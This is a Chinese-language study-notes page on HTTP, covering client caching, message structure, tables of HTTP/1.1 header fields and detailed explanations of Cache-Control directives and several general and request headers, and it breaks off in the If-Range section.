title="客户端的缓存"></a>客户端的缓存</h4><p>缓存不仅可以存在于缓存服务器内，还可以存在客户端浏览器中。以Internet Explorer 程序为例，把客户端缓存称为临时网络文件（Temporary Internet File）。<br>浏览器缓存如果有效，就不必再向服务器请求相同的资源了，可以直接从本地磁盘内读取。</p><h3 id="HTTP-出现之前的协议"><a href="#HTTP-出现之前的协议" class="headerlink" title="HTTP 出现之前的协议"></a>HTTP 出现之前的协议</h3><ol><li>FTP（File Transfer Protocol）<br>传输文件时使用的协议。</li><li>NNTP（Network News Transfer Protocol）<br>用于 NetNews 电子会议室内传送消息的协议。。</li><li>Archie<br>搜索 anonymous FTP 公开的文件信息的协议。</li><li>WAIS（Wide Area Information Servers）<br>以关键词检索多个数据库使用的协议。</li><li>Gopher<br>查找与互联网连接的计算机内信息的协议。</li></ol><h2 id="HTTP-首部"><a href="#HTTP-首部" class="headerlink" title="HTTP 首部"></a>HTTP 首部</h2><h3 id="HTTP-报文首部"><a href="#HTTP-报文首部" class="headerlink" title="HTTP 报文首部"></a>HTTP 报文首部</h3><p><img src="https://z3.ax1x.com/2021/04/20/cT5Xrj.png" alt="cT5Xrj.png"></p><p>HTTP 协议的请求和响应报文中必定包含 HTTP 首部。首部内容为客户端和服务器分别处理请求和响应提供所需要的信息。</p><h4 id="HTTP-请求报文"><a href="#HTTP-请求报文" class="headerlink" title="HTTP 请求报文"></a>HTTP 请求报文</h4><p><img src="https://z3.ax1x.com/2021/04/20/cT5xZn.png" alt="cT5xZn.png"></p><pre class=" language-http"><code class="language-http">GET / HTTP/1.1<span class="token header-name keyword">Host:</span> hackr.jp<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*; q=0.8<span class="token header-name keyword">Accept-Language:</span> ja,en-us;q=0.7,en;q=0.3<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">DNT:</span> 1<span class="token header-name keyword">Connection:</span> keep-alive<span class="token header-name keyword">If-Modified-Since:</span> Fri, 31 Aug 2007 02:02:20 GMT<span class="token header-name keyword">If-None-Match:</span> "45bae1-16a-46d776ac"<span class="token header-name keyword">Cache-Control:</span> max-age=0</code></pre><h4 id="HTTP-响应报文"><a href="#HTTP-响应报文" class="headerlink" title="HTTP 响应报文"></a>HTTP 响应报文</h4><p><img src="https://z3.ax1x.com/2021/04/20/cT5zaq.png" alt="cT5zaq.png"></p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">304 Not Modified</span></span><span class="token header-name keyword">Date:</span> Thu, 07 Jun 2012 07:21:36 GMT<span class="token header-name keyword">Server:</span> Apache<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Etag:</span> "45bae1-16a-46d776ac"</code></pre><h3 id="HTTP-首部字段"><a href="#HTTP-首部字段" class="headerlink" title="HTTP 首部字段"></a>HTTP 首部字段</h3><h4 id="HTTP-首部字段传递重要信息"><a href="#HTTP-首部字段传递重要信息" class="headerlink" title="HTTP 首部字段传递重要信息"></a>HTTP 首部字段传递重要信息</h4><h4 id="HTTP-首部字段结构"><a href="#HTTP-首部字段结构" class="headerlink" title="HTTP 首部字段结构"></a>HTTP 首部字段结构</h4><p>HTTP 首部字段是由首部字段名和字段值构成的</p><pre class=" language-http"><code class="language-http">首部字段名: 字段值<span class="token header-name keyword">Content-Type:</span> text/html<span class="token header-name keyword">Keep-Alive:</span> timeout=15, max=100</code></pre><p>若 <strong>HTTP</strong> 首部字段重复了会如何</p><p> 不同浏览器解析方式不同，有的是解析前面，有的则是解析后面的</p><h4 id="4-种-HTTP-首部字段类型"><a href="#4-种-HTTP-首部字段类型" class="headerlink" title="4 种 HTTP 首部字段类型"></a><strong>4</strong> 种 <strong>HTTP</strong> 首部字段类型</h4><ol><li>通用首部字段（<strong>General</strong> <strong>Header Fields</strong>）</li></ol><p>请求报文和响应报文两方都会使用的首部。</p><ol start="2"><li>请求首部字段（<strong>Request Header Fields</strong>）</li></ol><p>从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。</p><ol start="3"><li>响应首部字段（<strong>Response Header Fields</strong>）</li></ol><p>从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。</p><ol start="4"><li>实体首部字段（<strong>Entity Header Fields</strong>）</li></ol><p>针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息</p><h4 id="HTTP-1-1-首部字段一览"><a href="#HTTP-1-1-首部字段一览" class="headerlink" title="HTTP/1.1 首部字段一览"></a>HTTP/1.1 首部字段一览</h4><p>RFC2616 中定义的 47 种首部字段</p><h5 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h5><table><thead><tr><th align="left">首部字段名</th><th>说明</th></tr></thead><tbody><tr><td align="left">Cache-Control</td><td>控制缓存的行为</td></tr><tr><td align="left">Connection</td><td>逐跳首部、连接的管理</td></tr><tr><td align="left">Date</td><td>创建报文的日期时间</td></tr><tr><td align="left">Pragma</td><td>报文指令</td></tr><tr><td align="left">Trailer</td><td>报文末端的首部一览</td></tr><tr><td align="left">Transfer-Encoding</td><td>指定报文主体的传输编码方式</td></tr><tr><td align="left">Upgrade</td><td>升级为其他协议</td></tr><tr><td align="left">Via</td><td>代理服务器的相关信息</td></tr><tr><td align="left">Warning</td><td>错误通知</td></tr></tbody></table><h5 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h5><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Accept</td><td>用户代理可处理的媒体类型</td></tr><tr><td>Accept-Charset</td><td>优先的字符集</td></tr><tr><td>Accept-Encoding</td><td>优先的内容编码</td></tr><tr><td>Accept-Language</td><td>优先的语言（自然语言）</td></tr><tr><td>Authorization</td><td>Web认证信息</td></tr><tr><td>Expect</td><td>期待服务器的特定行为</td></tr><tr><td>From</td><td>用户的电子邮箱地址</td></tr><tr><td>Host</td><td>请求资源所在服务器</td></tr><tr><td>If-Match</td><td>比较实体标记（ETag）</td></tr><tr><td>If-Modified-Since</td><td>比较资源的更新时间</td></tr><tr><td>If-None-Match</td><td>比较实体标记（与 If-Match 相反）</td></tr><tr><td>If-Range</td><td>资源未更新时发送实体 Byte 的范围请求</td></tr><tr><td>If-Unmodified-Since</td><td>比较资源的更新时间（与If-Modified-Since相反）</td></tr><tr><td>Max-Forwards</td><td>最大传输逐跳数</td></tr><tr><td>Proxy-Authorization</td><td>代理服务器要求客户端的认证信息</td></tr><tr><td>Range</td><td>实体的字节范围请求</td></tr><tr><td>Referer</td><td>对请求中 URI 的原始获取方</td></tr><tr><td>TE</td><td>传输编码的优先级</td></tr><tr><td>User-Agent</td><td>HTTP  客户端程序的信息</td></tr></tbody></table><h5 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h5><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Accept-Ranges</td><td>是否接受字节范围请求</td></tr><tr><td>Age</td><td>推算资源创建经过时间</td></tr><tr><td>ETag</td><td>资源的匹配信息</td></tr><tr><td>Location</td><td>令客户端重定向至指定URI</td></tr><tr><td>Proxy-Authenticate</td><td>代理服务器对客户端的认证信息</td></tr><tr><td>Retry-After</td><td>对再次发起请求的时机要求</td></tr><tr><td>Server</td><td>HTTP服务器的安装信息</td></tr><tr><td>Vary</td><td>代理服务器缓存的管理信息</td></tr><tr><td>WWW-Authenticate</td><td>服务器对客户端的认证信息</td></tr></tbody></table><h5 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h5><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Allow</td><td>资源可支持的HTTP方法</td></tr><tr><td>Content-Encoding</td><td>实体主体适用的编码方式</td></tr><tr><td>Content-Language</td><td>实体主体的自然语言</td></tr><tr><td>Content-Length</td><td>实体主体的大小（单位：字节）</td></tr><tr><td>Content-Location</td><td>替代对应资源的URI</td></tr><tr><td>Content-MD5</td><td>实体主体的报文摘要</td></tr><tr><td>Content-Range</td><td>实体主体的位置范围</td></tr><tr><td>Content-Type</td><td>实体主体的媒体类型</td></tr><tr><td>Expires</td><td>实体主体过期的日期时间</td></tr><tr><td>Last-Modified</td><td>资源的最后修改日期时间</td></tr></tbody></table><h4 id="非-HTTP-1-1-首部字段"><a href="#非-HTTP-1-1-首部字段" class="headerlink" title="非 HTTP/1.1 首部字段"></a>非 <strong>HTTP/1.1</strong> 首部字段</h4><p>RFC4229</p><p>Cookie、Set-Cookie 和 Content-Disposition 等</p><h4 id="End-to-end-首部和-Hop-by-hop-首部"><a href="#End-to-end-首部和-Hop-by-hop-首部" class="headerlink" title="End-to-end 首部和 Hop-by-hop 首部"></a><strong>End-to-end</strong> 首部和 <strong>Hop-by-hop</strong> 首部</h4><h5 id="端到端首部（End-to-end-Header）"><a href="#端到端首部（End-to-end-Header）" class="headerlink" title="端到端首部（End-to-end Header）"></a>端到端首部（<strong>End-to-end Header</strong>）</h5><p>分在此类别中的首部会转发给请求 / 响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。</p><h5 id="逐跳首部（Hop-by-hop-Header）"><a href="#逐跳首部（Hop-by-hop-Header）" class="headerlink" title="逐跳首部（Hop-by-hop Header）"></a>逐跳首部（<strong>Hop-by-hop Header</strong>）</h5><p>分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再转发。HTTP/1.1 和之后版本中，如果要使用 hop-by-hop 首部，需提供 Connection 首部字段。</p><p>除了一下8种其他全是端到端首部</p><table><thead><tr><th>Connection</th></tr></thead><tbody><tr><td>Keep-Alive</td></tr><tr><td><strong>Proxy-Authenticate</strong></td></tr><tr><td><strong>Proxy-Authorization</strong></td></tr><tr><td><strong>Trailer</strong></td></tr><tr><td>TE</td></tr><tr><td><strong>Transfer-Encoding</strong></td></tr><tr><td><strong>Upgrade</strong></td></tr></tbody></table><h3 id="HTTP-1-1-通用首部字段"><a href="#HTTP-1-1-通用首部字段" class="headerlink" title="HTTP/1.1 通用首部字段"></a><strong>HTTP/1.1</strong> 通用首部字段</h3><p>通用首部字段是指，请求报文和响应报文双方都会使用的首部。</p><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a><strong>Cache-Control</strong></h4><p>首部字段 <strong>Cache-Control</strong> 能够控制缓存的行为</p><p>写法<code>Cache-Control: private, max-age=0, no-cache</code></p><h5 id="缓存请求指令"><a href="#缓存请求指令" class="headerlink" title="缓存请求指令"></a>缓存请求指令</h5><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>no-cache</td><td>无</td><td>强制向源服务器再次验证</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>max-age  = [ 秒]</td><td>必需</td><td>响应的最大Age值</td></tr><tr><td>max-stale( = [ 秒])</td><td>可省略</td><td>接收已过期的响应</td></tr><tr><td>min-fresh  = [ 秒]</td><td>必需</td><td>期望在指定时间内的响应仍有效</td></tr><tr><td>no-transform</td><td>无</td><td>代理不可更改媒体类型</td></tr><tr><td>only-if-cached</td><td>无</td><td>从缓存获取资源</td></tr><tr><td>cache-extension</td><td>-</td><td>新指令标记（token）</td></tr></tbody></table><h5 id="缓存响应指令"><a href="#缓存响应指令" class="headerlink" title="缓存响应指令"></a>缓存响应指令</h5><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>public</td><td>无</td><td>可向任意方提供响应的缓存</td></tr><tr><td>private</td><td>可省略</td><td>仅向特定用户返回响应</td></tr><tr><td>no-cache</td><td>可省略</td><td>缓存前必须先确认其有效性</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>no-transform</td><td>无</td><td>代理不可更改媒体类型</td></tr><tr><td>must-revalidate</td><td>无</td><td>可缓存但必须再向源服务器进行确认</td></tr><tr><td>proxy-revalidate</td><td>无</td><td>要求中间缓存服务器对缓存的响应有效性再进行确认</td></tr><tr><td>max-age = [ 秒]</td><td>必需</td><td>响应的最大Age值</td></tr><tr><td>s-maxage  = [ 秒]</td><td>必需</td><td>公共缓存服务器响应的最大Age值</td></tr><tr><td>cache-extension</td><td>-</td><td>新指令标记（token）</td></tr></tbody></table><h5 id="表示是否能缓存的指令"><a href="#表示是否能缓存的指令" class="headerlink" title="表示是否能缓存的指令"></a>表示是否能缓存的指令</h5><ul><li><p><code>Cache-Control: public</code></p><p>当指定使用 public 指令时，则明确表明其他用户也可利用缓存。</p></li><li><p><code>Cache-Control: private</code></p><p>当指定 private 指令后，响应只以特定的用户作为对象，这与 public指令的行为相反。</p><p>缓存服务器会对该特定用户提供资源缓存的服务，对于其他用户发送过来的请求，代理服务器则不会返回缓存。</p></li><li><p><code>Cache-Control: no-cache</code></p><p>使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。 </p><p>客户端发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。中间缓存服务器不缓存，相当于隧道不对报文做文章。</p></li></ul><ul><li><p><code>Cache-Control: no-cache=Location</code></p><p>由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数。</p></li></ul><h5 id="控制可执行缓存的对象的指令"><a href="#控制可执行缓存的对象的指令" class="headerlink" title="控制可执行缓存的对象的指令"></a>控制可执行缓存的对象的指令</h5><ul><li><p><code>Cache-Control: no-store</code></p><p>当使用 no-store 指令时，暗示请求（和对应的响应）或响应中包含机密信息。</p><p>该指令规定缓存不能在本地存储请求或响应的任一部分。</p></li></ul><h5 id="指定缓存期限和认证的指令"><a href="#指定缓存期限和认证的指令" class="headerlink" title="指定缓存期限和认证的指令"></a>指定缓存期限和认证的指令</h5><ul><li><p><code>Cache-Control: s-maxage=604800（单位 ：秒）</code></p><p>s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s- maxage 指令只适用于供多位用户使用的公共缓存服务器 。也就是说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。</p><p>当使用 s-maxage 指令后，则直接忽略对 Expires 首部字段及max-age 指令的处理。</p></li><li><p><code>Cache-Control: max-age=604800（单位：秒）</code></p><p>当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。另外，当指定 max-age 值为 0，那么缓存服务器通常需要将请求转发给源服务器。</p><p>当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，而 max-age 数值代表资源保存为缓存的最长时间。</p><p>应用 HTTP/1.1 版本的缓存服务器遇到同时存在 Expires 首部字段的情况时，会优先处理 max-age 指令，而忽略掉 Expires 首部字段。而HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略掉。</p></li><li><p><code>Cache-Control: min-fresh=60（单位：秒）</code></p><p>min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。</p></li><li><p><code>Cache-Control: max-stale=3600（单位：秒）</code></p><p>使用 max-stale 可指示缓存资源，即使过期也照常接收。</p><p>如果指令未指定参数值，那么无论经过多久，客户端都会接收响应； 如果指令中指定了具体数值，那么即使过期，只要仍处于 max-stale 指定的时间内，仍旧会被客户端接收。</p></li><li><p><code>Cache-Control: only-if-cached</code></p><p>使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。</p></li><li><p><code>Cache-Control: must-revalidate</code></p><p>使用 must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。</p><p>若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条 504（Gateway Timeout）状态码。</p><p>另外，使用 must-revalidate 指令会忽略请求的 max-stale 指令（即使已经在首部使用了 max-stale，也不会再有效果）。</p></li><li><p><code>Cache-Control: proxy-revalidate</code></p><p>proxy-revalidate 指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。</p></li><li><p><code>Cache-Control: no-transform</code></p><p>使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。</p><p>这样做可防止缓存或代理压缩图片等类似操作。</p></li></ul><h5 id="Cache-Control-扩展"><a href="#Cache-Control-扩展" class="headerlink" title="Cache-Control 扩展"></a>Cache-Control 扩展</h5><p><code>Cache-Control: private, community=&quot;UCI&quot;</code></p><p>通过 cache-extension 标记（token），可以扩展 Cache-Control 首部字段内的指令。</p><p>如上例，Cache-Control 首部字段本身没有 community 这个指令。借助extension tokens 实现了该指令的添加。如果缓存服务器不能理解community 这个新指令，就会直接忽略。因此，extension tokens 仅对能理解它的缓存服务器来说是有意义的。</p><h4 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h4><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><ul><li><p>控制不再转发给代理的首部字段<code>Connection: 不再转发的首部字段名</code></p><p><img src="https://z3.ax1x.com/2021/04/21/cHInJ0.png" alt="cHInJ0.png"></p></li><li><p>管理持久连接</p><p>HTTP/1.1 之前的 HTTP 版本的默认连接都是非持久连接。为此，如果想在旧版本的 HTTP 协议上维持持续连接，则需要指定Connection 首部字段的值为 Keep-Alive。<code>Connection: Keep-Alive</code></p><p><img src="https://z3.ax1x.com/2021/04/21/cHIuWV.png" alt="cHIuWV.png"></p><p>HTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定Connection 首部字段的值为 Close。<code>Connection: close</code></p></li></ul><h4 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h4><p>首部字段 Date 表明创建 HTTP 报文的日期和时间。</p><ul><li><p>HTTP/1.1 协议使用在 RFC1123 中规定的日期时间的格式</p><p><code>Date: Tue, 03 Jul 2012 04:40:59 GMT</code></p></li><li><p>之前的 HTTP 协议版本中使用在 RFC850 中定义的格式</p><p><code>Date: Tue, 03-Jul-12 04:40:59 GMT</code></p></li><li><p>C 标准库内的 asctime() 函数的输出格式</p><p><code>Date: Tue Jul 03 04:40:59 2012</code></p></li></ul><h4 id="Pragma"><a href="#Pragma" class="headerlink" title="Pragma"></a>Pragma</h4><p>Pragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。相当于HTTP/1.1之后Cache-Control</p><p><code>Pragma: no-cache</code></p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Cache-Control:</span> no-cache <span class="token header-name keyword">Pragma:</span> no-cache</code></pre><p>通常一起用，因为你不能掌握全部中间服务器</p><h4 id="Trailer"><a href="#Trailer" class="headerlink" title="Trailer"></a>Trailer</h4><p>首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。</p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">200 OK</span></span><span class="token header-name keyword">Date:</span> Tue, 03 Jul 2012 04:40:56 GMT<span class="token header-name keyword">Content-Type:</span> text/html...<span class="token header-name keyword">Transfer-Encoding:</span> chunked<span class="token header-name keyword">Trailer:</span> Expires<span class="token text/html">...(报文主体)... 0Expires: Tue, 28 Sep 2004 23:59:59 GMT</span></code></pre><p>以上用例中，指定首部字段 Trailer 的值为 Expires，在报文主体之后（分块长度 0 之后）出现了首部字段 Expires。</p><h4 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h4><p>首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。</p><p>HTTP/1.1 的传输编码方式仅对分块传输编码有效。</p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">200 OK</span></span><span class="token header-name keyword">Date:</span> Tue, 03 Jul 2012 04:40:56 GMT<span class="token header-name keyword">Cache-Control:</span> public, max-age=604800 <span class="token header-name keyword">Content-Type:</span> text/javascript; charset=utf-8 <span class="token header-name keyword">Expires:</span> Tue, 10 Jul 2012 04:40:56 GMT<span class="token header-name keyword">X-Frame-Options:</span> DENY<span class="token header-name keyword">X-XSS-Protection:</span> 1; mode=block <span class="token header-name keyword">Content-Encoding:</span> gzip <span class="token header-name keyword">Transfer-Encoding:</span> chunked <span class="token header-name keyword">Connection:</span> keep-alive</code></pre><h4 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h4><p>首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。</p><p><img src="https://z3.ax1x.com/2021/04/21/cHIKzT.png" alt="cHIKzT.png"></p><p>上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。</p><p>对于附有首部字段 Upgrade 的请求，服务器可用 101 Switching Protocols 状态码作为响应返回。</p><h4 id="Via"><a href="#Via" class="headerlink" title="Via"></a>Via</h4><p>使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。</p><p><img src="https://z3.ax1x.com/2021/04/21/cHIQQU.png" alt="cHIQQU.png"></p><p>首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。</p><p>1.0是指代理服务器的HTTP版本</p><h4 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h4><p>HTTP/1.1 的 Warning 首部是从 HTTP/1.0 的响应首部（Retry-After）演变过来的。该首部通常会告知用户一些与缓存相关的问题的警告。</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Warning:</span> [警告码][警告的主机:端口号]“[警告内容]”([日期时间])<span class="token header-name keyword">Warning:</span> 113 gw.hackr.jp:8080 "Heuristic expiration" Tue, 03</code></pre><h5 id="HTTP-1-1-警告码"><a href="#HTTP-1-1-警告码" class="headerlink" title="HTTP/1.1 警告码"></a><strong>HTTP/1.1</strong> 警告码</h5><table><thead><tr><th>警告码</th><th>警告内容</th><th>说明</th></tr></thead><tbody><tr><td>110</td><td>Response  is stale（响应已过期）</td><td>代理返回已过期的资源</td></tr><tr><td>111</td><td>Revalidation  failed（再验证失败）</td><td>代理再验证资源有效性时失败（服务器无法到达等原因）</td></tr><tr><td>112</td><td>Disconnection operation（断开连接操作）</td><td>代理与互联网连接被故意切断</td></tr><tr><td>113</td><td>Heuristic  expiration（试探性过期）</td><td>响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）</td></tr><tr><td>199</td><td>Miscellaneous  warning（杂项警告）</td><td>任意的警告内容</td></tr><tr><td>214</td><td>Transformation  applied（使用了转换）</td><td>代理对内容编码或媒体类型等执行了某些处理时</td></tr><tr><td>299</td><td>Miscellaneous persistent  warning（持久杂项警告）</td><td>任意的警告内容</td></tr></tbody></table><h3 id="请求首部字段-1"><a href="#请求首部字段-1" class="headerlink" title="请求首部字段"></a>请求首部字段</h3><p>请求首部字段是从客户端往服务器端发送请求报文中所使用的字段， 用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。</p><h4 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHIlyF.png" alt="cHIlyF.png"></p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.1</code></pre><ul><li><p>文本文件</p><p>text/html, text/plain, text/css … </p><p>application/xhtml+xml, application/xml …</p></li><li><p>图片文件</p><p>image/jpeg, image/gif, image/png …</p></li><li><p>视频文件</p><p>video/mpeg, video/quicktime …</p></li><li><p>应用程序使用的二进制文件</p><p>application/octet-stream, application/zip …</p></li></ul><p>比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。</p><p>若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值1，用分（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。</p><h4 id="Accept-Charset"><a href="#Accept-Charset" class="headerlink" title="Accept-Charset"></a>Accept-Charset</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHI1L4.png" alt="cHI1L4.png"></p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Accept-Charset:</span> iso-8859-5, unicode-1-1;q=0.8</code></pre><h4 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate</code></pre><p>Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。</p><ul><li>gzip</li><li>compress</li><li>deflate</li><li>identity</li></ul><p>也能使用权重q，使用<code>*</code>作为通配符</p><h4 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Accept-Language:</span> zh-cn,zh;q=0.7,en-us,en;q=0.3</code></pre><p>首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。</p><h4 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHI8eJ.png" alt="cHI8eJ.png"></p><p>首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。</p><h4 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHIGw9.png" alt="cHIGw9.png"></p><p>客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行为。因服务器无法理解客户端的期望作出回应而发生错误时，会返回状态码 417 Expectation Failed。</p><p>客户端可以利用该首部字段，写明所期望的扩展。</p><h4 id="From"><a href="#From" class="headerlink" title="From"></a>From</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHIJoR.png" alt="cHIJoR.png"></p><p>首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。</p><h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Host:</span> www.hackr.jp</code></pre><p>首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端口号。Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请求内的首部字段。</p><p>虚拟主机运行在同一个 <strong>IP</strong> 上，因此使用首部字段 <strong>Host</strong> 加以区分</p><p>若服务器未设定主机名，那直接发送一个空值即可。</p><h4 id="If-XXX"><a href="#If-XXX" class="headerlink" title="If-XXX"></a>If-XXX</h4><p>形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。</p><p><img src="https://z3.ax1x.com/2021/04/21/cHItF1.png" alt="cHItF1.png"></p><h4 id="If-Match"><a href="#If-Match" class="headerlink" title="If-Match"></a>If-Match</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">If-Match:</span> "123456"</code></pre><p>首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。</p><p>服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。</p><p>通配符<code>*</code>跳过匹配</p><h4 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">If-Modified-Since:</span> Thu, 15 Apr 2004 00:00:00 GMT</code></pre><p>首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 If- Modified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。</p><p>If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。</p><h4 id="If-None-Match"><a href="#If-None-Match" class="headerlink" title="If-None-Match"></a>If-None-Match</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHIUW6.png" alt="cHIUW6.png"></p><p>它和首部字段 If-Match 作用相反。</p><p>在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。</p><h4 id="If-Range"><a href="#If-Range" class="headerlink" title="If-Range"></a>If-Range</h4><p>首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If- Range 字段值（ETag 